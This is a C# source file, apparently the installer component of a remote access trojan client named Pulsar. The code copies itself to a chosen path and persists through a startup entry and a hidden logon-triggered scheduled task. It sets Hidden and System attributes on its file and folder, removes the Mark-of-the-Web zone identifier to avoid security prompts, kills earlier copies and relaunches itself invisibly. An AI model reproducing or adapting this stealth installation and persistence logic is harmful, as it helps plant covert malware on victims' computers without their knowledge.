using Pulsar.Client.Config;
using Pulsar.Client.Extensions;
using Pulsar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Pulsar.Client.Setup
{
    public class ClientInstaller : ClientSetupBase
    {
        public void ApplySettings()
        {
            string exePath = Application.ExecutablePath;
            string installPath = Settings.INSTALLPATH;

            // STARTUP
            if (Settings.STARTUP)
            {
                var startup = new ClientStartup();
                string startupTarget = Settings.INSTALL ? installPath : exePath;

                startup.AddToStartup(startupTarget, Settings.STARTUPKEY);
            }

            //scheduled task
            if (Settings.SCHEDULEDTASK)
            {
                try
                {
                    CreateScheduledTask(Settings.INSTALLPATH, Settings.STARTUPKEY);
                }
                catch (Exception ex)
                {
                    Debug.WriteLine("ScheduledTask Error: " + ex.Message);
                }
            }

            // FILE HIDE (Hidden + System)
            if (Settings.INSTALL && Settings.HIDEFILE)
            {
                TrySetFileAttributes(installPath, FileAttributes.Hidden | FileAttributes.System);
            }

            // HIDE INSTALL DIRECTORY
            if (Settings.INSTALL && Settings.HIDEINSTALLSUBDIRECTORY &&
                !string.IsNullOrEmpty(Settings.SUBDIRECTORY))
            {
                string dir = Path.GetDirectoryName(installPath);
                TrySetDirectoryAttributes(dir, FileAttributes.Hidden | FileAttributes.System);
            }
        }
        private void CreateScheduledTask(string exePath, string taskName)
        {
            Process.Start(new ProcessStartInfo
            {
                FileName = "schtasks.exe",
                Arguments = $"/Create /SC ONLOGON /TN \"{taskName}\" /TR \"\\\"{exePath}\\\"\" /F",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }

        public void Install()
        {
            string installPath = Settings.INSTALLPATH;
            string installDir = Path.GetDirectoryName(installPath);

            // Ensure directory exists
            if (!Directory.Exists(installDir))
                Directory.CreateDirectory(installDir);

            // Replace existing file if needed
            HandleExistingInstallation(installPath);

            // Copy new client
            File.Copy(Application.ExecutablePath, installPath, true);

            // Apply settings (startup, hiding, etc.)
            ApplySettings();

            // Remove MOTW
            FileHelper.DeleteZoneIdentifier(installPath);

            // Launch installed copy
            Process.Start(new ProcessStartInfo
            {
                FileName = installPath,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            });
        }

        // ---------------------------------------------------------------------

        private void HandleExistingInstallation(string installPath)
        {
            if (!File.Exists(installPath))
                return;

            try
            {
                File.Delete(installPath);
            }
            catch (Exception ex) when (ex is IOException || ex is UnauthorizedAccessException)
            {
                KillExistingProcessAtPath(installPath);

                // try delete again
                try { File.Delete(installPath); }
                catch { /* ignore */ }
            }
        }

        private void KillExistingProcessAtPath(string installPath)
        {
            string procName = Path.GetFileNameWithoutExtension(installPath);
            int currentPid = Process.GetCurrentProcess().Id;

            foreach (var p in Process.GetProcessesByName(procName))
            {
                try
                {
                    if (p.Id == currentPid) continue;
                    if (p.GetMainModuleFileName() != installPath) continue;

                    p.Kill();
                    p.WaitForExit(2000);
                }
                catch { /* ignore */ }
            }
        }

        // ---------------------------------------------------------------------

        private void TrySetFileAttributes(string path, FileAttributes attrs)
        {
            try
            {
                var existing = File.GetAttributes(path);
                File.SetAttributes(path, existing | attrs);
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to set file attrs: {ex}");
            }
        }

        private void TrySetDirectoryAttributes(string path, FileAttributes attrs)
        {
            try
            {
                var di = new DirectoryInfo(path);
                di.Attributes |= attrs;
            }
            catch (Exception ex)
            {
                Debug.WriteLine($"Failed to set dir attrs: {ex}");
            }
        }
    }
}
